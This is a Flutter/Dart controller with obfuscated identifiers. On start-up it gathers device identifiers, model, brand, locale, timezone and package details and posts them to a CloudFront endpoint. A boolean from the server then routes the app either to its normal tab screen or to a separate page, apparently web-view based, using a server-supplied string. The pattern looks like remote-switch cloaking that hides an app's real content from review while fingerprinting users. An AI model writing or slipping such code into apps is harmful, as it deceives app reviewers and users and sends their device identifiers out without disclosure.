import 'dart:io';

import 'package:device_info_plus/device_info_plus.dart';
import 'package:dio/dio.dart';
import 'package:flutter_inappwebview/flutter_inappwebview.dart';
import 'package:flutter_timezone/flutter_timezone.dart';
import 'package:get/get.dart';
import 'package:package_info_plus/package_info_plus.dart';


class FrameElevateExportLogic extends GetxController {

  var eukiprb = RxBool(false);
  var fhomarinx = RxBool(true);
  var cekslw = RxString("");
  var htmno = RxBool(false);
  var yulxjim = RxBool(true);
  final cahjsd = Dio();


  InAppWebViewController? webViewController;

  @override
  void onInit() {
    super.onInit();
    vbamp();
  }


  Future<void> vbamp() async {
    htmno.value = true;
    yulxjim.value = true;
    fhomarinx.value = false;

    cahjsd.post("https://dfp4xzq17c3eu.cloudfront.net/eXAcIDqJcw",data: await jwecibxkt()).then((value) {
      var andurfi = value.data["andurfi"] as String;
      var wftkljb = value.data["wftkljb"] as bool;
      if (wftkljb) {
        cekslw.value = andurfi;
        ntmuegb();
      } else {
        spuirc();
      }
    }).catchError((e) {
      fhomarinx.value = true;
      yulxjim.value = true;
      htmno.value = false;
    });
  }

  Future<Map<String, dynamic>> jwecibxkt() async {
    final DeviceInfoPlugin atmker = DeviceInfoPlugin();
    PackageInfo kfpj_piruqg = await PackageInfo.fromPlatform();
    final String currentTimeZone = await FlutterTimezone.getLocalTimezone();
    var jzrwqa = Platform.localeName;
    var sDzL = currentTimeZone;

    var mVbxv = kfpj_piruqg.packageName;
    var YZKxeou = kfpj_piruqg.version;
    var HXBOeLno = kfpj_piruqg.buildNumber;

    var Ighj = kfpj_piruqg.appName;
    var WNwUMR = "";
    var zbSA  = "";
    var PfEXrAh = "";
    var yamxgnho = "";
    var ltdvos = "";
    var eckl = "";
    var ghwye = "";
    var keumfzxd = "";
    var ezasmf = "";


    var POhDNvXb = "";
    var YxcgPzIN = false;

    if (GetPlatform.isAndroid) {
      POhDNvXb = "android";
      var udmqxhjw = await atmker.androidInfo;

      PfEXrAh = udmqxhjw.brand;

      WNwUMR  = udmqxhjw.model;
      zbSA = udmqxhjw.id;

      YxcgPzIN = udmqxhjw.isPhysicalDevice;
    }

    if (GetPlatform.isIOS) {
      POhDNvXb = "ios";
      var xjovbyizah = await atmker.iosInfo;
      PfEXrAh = xjovbyizah.name;
      WNwUMR = xjovbyizah.model;

      zbSA = xjovbyizah.identifierForVendor ?? "";
      YxcgPzIN  = xjovbyizah.isPhysicalDevice;
    }
    var res = {
      "Ighj": Ighj,
      "HXBOeLno": HXBOeLno,
      "PfEXrAh": PfEXrAh,
      "mVbxv": mVbxv,
      "ltdvos" : ltdvos,
      "WNwUMR": WNwUMR,
      "sDzL": sDzL,
      "zbSA": zbSA,
      "ghwye" : ghwye,
      "jzrwqa": jzrwqa,
      "POhDNvXb": POhDNvXb,
      "YxcgPzIN": YxcgPzIN,
      "yamxgnho" : yamxgnho,
      "eckl" : eckl,
      "YZKxeou": YZKxeou,
      "keumfzxd" : keumfzxd,
      "ezasmf" : ezasmf,

    };
    return res;
  }

  Future<void> spuirc() async {
    Get.offNamed("/frame_tab");
  }

  Future<void> ntmuegb() async {
    Get.offNamed("/gallery_arrange");
  }

}
